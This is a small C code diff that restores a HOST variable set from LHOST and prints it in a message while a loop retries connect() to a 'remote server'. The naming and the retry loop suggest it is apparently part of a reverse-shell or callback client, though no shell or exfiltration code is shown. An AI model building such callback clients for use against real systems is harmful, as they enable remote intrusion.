@@ -33,7 +33,7 @@ int main(int argc, char* argv[]) {
         return EXIT_FAILURE;
     }
 
-    // char HOST[] = LHOST;
+    char HOST[] = LHOST;
     int n = 0;
     char buffer[1024];
     struct sockaddr_in serv_addr;
@@ -48,7 +48,7 @@ int main(int argc, char* argv[]) {
     serv_addr.sin_family = AF_INET;
     serv_addr.sin_port = htons(PORT);
     serv_addr.sin_addr.s_addr = INADDR_ANY;
-    printf("[+] Attempting to connect to remote server at %s:%d...", LHOST, PORT);
+    printf("[+] Attempting to connect to remote server at %s:%d...", HOST, PORT);
     fflush(stdout);
 
     while (connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
